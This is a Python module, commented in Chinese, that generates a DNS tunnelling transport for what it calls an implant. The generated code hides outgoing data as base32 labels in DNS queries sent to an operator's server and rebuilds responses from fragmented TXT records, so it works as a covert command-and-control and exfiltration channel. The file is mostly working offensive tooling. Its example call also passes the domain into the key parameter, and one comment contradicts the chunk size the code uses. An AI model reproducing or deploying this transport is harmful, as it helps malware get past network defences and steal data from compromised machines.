"""
@module: transport_dns
@desc: 生成 DNS 隧道传输实现代码（f8 基础版，TXT 分片响应）
@params: host port domain key_hex
"""
MODULE = {
    "desc": "生成 DNS 隧道传输实现代码（UDP 查询 + TXT 响应分片）",
    "params": [
        ("host", "必填，DNS 监听地址"),
        ("port", "必填，DNS 监听端口"),
        ("key_hex", "必填，server implant_key"),
        ("domain", '可选；隧道域名，默认用 host（uplevel 传参一致）'),
    ],
}


def run(host, port, key_hex, domain=""):
    """生成 _nT() 实现：DnsSocket（sendall 缓存 → A 查询 → TXT 解析缓存）。

    请求帧 base32 编码进查询域名（小块）；响应经多条 TXT 记录分片
    返回。与 implant 的 p()/q() 兼容。

    domain 缺省用 host：DNS 查询直接发给 host:port，域名本身不解析，
    直接用服务器地址即可工作（S6：与 uplevel 的 3 参调用一致）。
    """
    host = str(host)
    port = int(port)
    domain = str(domain) if domain else host

    code = f'''\
import socket as _sa, struct as _st, base64 as _b64
def _b32e(d):
    return _b64.b32encode(d).decode().rstrip("=")
def _b32d(s):
    return _b64.b32decode(s + "=" * (-len(s) % 8))
def _mkq(name, tid):
    q = _st.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    for p in name.split("."):
        q += bytes([len(p)]) + p.encode()
    return q + b"\\x00\\x00\\x01\\x00\\x01"
def _parse_txt(data):
    if len(data) < 12:
        return []
    off = 12
    while off < len(data) and data[off] != 0:
        off += 1 + data[off]
    off += 1 + 4
    an = _st.unpack(">H", data[6:8])[0]
    out = []
    for _ in range(an):
        if off >= len(data):
            break
        if data[off] & 0xC0:
            off += 2
        else:
            while off < len(data) and data[off] != 0:
                off += 1 + data[off]
            off += 1
        if off + 10 > len(data):
            break
        rtype, _c, _t, rdlen = _st.unpack(">HHIH", data[off:off + 10])
        off += 10
        rdata = data[off:off + rdlen]
        off += rdlen
        if rtype == 16 and rdata:
            n = rdata[0]
            out.append(rdata[1:1 + n])
    return out
class _DS:
    def __init__(s, h, p, dom):
        s._h, s._p, s._dom = h, p, dom
        s._buf = b""
        s._resp = b""
        s._bid = ""
        s._tid = 0x1234
    def settimeout(s, t):
        pass
    def sendall(s, data):
        s._buf += data
        s._resp = b""
    def recv(s, n):
        if not s._resp:
            s._resp = s._query()
        out, s._resp = s._resp[:n], s._resp[n:]
        return out
    def _one(s, name):
        s._tid = (s._tid + 1) & 0xFFFF
        q = _mkq(name, s._tid)
        u = _sa.socket(_sa.AF_INET, _sa.SOCK_DGRAM)
        u.settimeout(10)
        u.sendto(q, (s._h, s._p))
        resp = u.recv(4096)
        u.close()
        return _parse_txt(resp)
    def _resolve(s, name):
        parts = s._one(name)
        # 分片响应标记 s<total>（小写 s 不与 base32 字母冲突）→ 逐片拉取
        if len(parts) == 1 and parts[0].startswith(b"s") and parts[0][1:].isdigit():
            total = int(parts[0][1:].decode())
            out = []
            for i in range(total):
                ps = s._one(f"r{{i}}.{{s._bid}}.{{s._dom}}")
                if not ps or not ps[0]:
                    return b""
                out.append(ps[0])
            return _b32d(b"".join(out).decode())
        return _b32d("".join(p.decode() for p in parts)) if parts else b""
    def _query(s):
        data = s._buf
        s._buf = b""
        if not data:
            return s._resolve(f"poll.{{s._bid}}.{{s._dom}}")
        b32 = _b32e(data)
        # 帧 base32 分片（≤180 字符/段）逐段查询，收最后一段的响应
        chunks = [b32[i:i + 60] for i in range(0, len(b32), 60)]
        resp = b""
        for i, ch in enumerate(chunks):
            name = f"{{ch}}.{{i}}.{{len(chunks)}}.{{s._bid}}.{{s._dom}}"
            resp = s._resolve(name)
        return resp
    def close(s):
        pass
def _nT():
    s = _DS({host!r}, {port}, {domain!r})
    s._bid = _D
    return s
'''
    return code


if __name__ == "__main__":
    print(run("127.0.0.1", 5353, "t.example.com", "ab" * 32))
